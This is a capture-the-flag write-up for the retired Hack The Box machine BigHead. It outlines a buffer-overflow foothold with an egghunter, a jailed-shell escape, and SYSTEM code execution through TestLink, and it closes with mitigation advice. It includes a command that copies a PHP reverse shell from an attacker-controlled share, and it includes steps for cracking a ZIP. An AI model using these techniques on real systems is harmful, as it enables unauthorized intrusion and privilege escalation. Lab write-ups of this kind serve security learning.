---
machine: BigHead
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, web, buffer-overflow, keepass, privesc]
---

# BigHead — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`dev.bighead.htb` exposes a backup and the GitHub history reveals an older build with the server binary. `BigheadWebSrv` has a URL-handler overflow; an egghunter yields a `nelson` shell. From there, escape `BvShell`, find TestLink and use `linkto.php` to run PHP as SYSTEM. The root flag sits in a KeePass database with a keyfile hidden in an ADS stream.

## Recon

```bash
nmap -Pn -sCV -p80,443 <IP>
```

- `80/tcp` runs nginx 1.14.0 with the BigHead site.
- `ffuf` with `Host: FUZZ.bighead.htb` finds `dev.bighead.htb` and `code.bighead.htb`.
- The dev site offers `BHWS_Backup.zip`.

## Enumeration

- The ZIP is encrypted; `zip2john` and John open it with a dictionary password.
- The backup contains `bHeadSvr.dll`, `BigheadWebSvr.exe` and the nginx configuration.
- The GitHub repository keeps an older commit with a different ZIP and the vulnerable binary.

## Foothold

`BigheadWebSrv` copies the URL into a fixed buffer. Compute the offset, use an egghunter to locate the shellcode and send the request; the service runs as `nelson`.

```text
GET /<PADDING><EGGHUNTER><SHELLCODE> HTTP/1.1
Host: <IP>
```

## Lateral movement

`nelson` can run `BvShell` as `nginx`, but the shell is jailed. A `cd` into an accessible path and `..` escape to `C:\apps`; there TestLink and its `linkto.php` include a controllable file.

```cmd
copy \\<ATTACKER>\share\php-rev-shell.php C:\Users\nelson\AppData\Local\Temp\a.php
```

POST to `http://localhost:5080/testlink/linkto.php` and the PHP runs as SYSTEM.

## Privilege escalation

Enumeration of `C:\` finds a KeePass database and a keyfile inside an alternate data stream (`Get-Item -Stream *`). Open the database with both and read the root flag.

```powershell
Get-Item -Path C:\Users\Administrator\Desktop\*.kdbx -Stream *
```

## Evidence

- `dev.bighead.htb`, encrypted backup and old GitHub commit.
- URL-handler crash and a `nelson` shell.
- `BvShell` escape and PHP execution as SYSTEM.
- KeePass database and keyfile in an ADS.

## Lessons learned

- A Git repository can retain binaries and secrets no longer on the site.
- An old service with manual buffer handling remains exploitable.
- A shell jail is not a security boundary if the binary allows relative paths.

## Mitigation and detection

- Remove binaries and backups from public repositories; rotate secrets.
- Use safe copy functions and compile with mitigations.
- Review internal services and restrict jailed shells.

## References

- [0xdf — BigHead](https://0xdf.gitlab.io/2019/05/04/htb-bighead.html)
- [IppSec — BigHead](https://www.youtube.com/watch?v=VBt-CmjMYiM)
- [Hack The Box — BigHead](https://app.hackthebox.com/machines/bighead)
